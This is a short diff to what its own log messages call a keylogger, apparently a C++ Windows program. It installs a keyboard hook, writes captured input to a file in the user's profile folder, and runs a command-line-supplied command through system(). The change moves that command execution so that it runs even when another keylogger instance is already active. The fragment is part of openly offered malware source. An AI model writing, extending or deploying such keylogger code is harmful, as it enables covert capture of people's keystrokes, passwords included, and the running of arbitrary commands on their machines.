@@ -187,9 +187,7 @@ LRESULT __stdcall callback(int nCode, WPARAM wParam, LPARAM lParam) {
 	return CallNextHookEx(hook, nCode, wParam, lParam);
 }
 
-void initialize(const char* command, const char* outputFile) {
-    system(command);
-
+void initialize(const char* outputFile) {
     std::string path = getenv("USERPROFILE");
     path += "\\";
     path += outputFile;
@@ -241,13 +239,16 @@ int32_t main(int32_t length, char** arguments) {
     }
 
     if (result == 0) {
+        /* Execute the command even if the keylogger is already running. */
+        std::cout << "[info] Executing command '" << command << "'\n";
+        system(command);
+        
         if (isDuplicateInstance()) {
             std::cout << "[error] The keylogger is already running.\n";
             result = 1;
         }
         else {
-            initialize(command, outputFile);
-
+            initialize(outputFile);
             std::cout << "[info] Keylogger started...\n";
             MSG message;
             while (GetMessage(&message, NULL, 0, 0)) {
